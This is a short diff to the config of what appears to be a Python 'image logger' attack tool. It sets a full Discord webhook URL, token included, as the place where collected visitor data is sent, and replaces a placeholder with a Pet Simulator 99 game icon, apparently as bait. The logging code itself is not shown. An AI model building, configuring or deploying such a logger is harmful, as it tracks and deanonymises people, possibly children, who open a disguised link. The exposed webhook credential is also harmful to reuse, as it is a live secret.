@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1393671218132942868/DYikdF14rID8bNLr6ZSJ2mc1XH7-oXcGrf7DbeakTERvWfIcVkr-QclZlHQVDI6v7Kf7",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://static.wikia.nocookie.net/pet-simulator/images/2/22/PS99Icon.png/revision/latest?cb=20240128031746", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
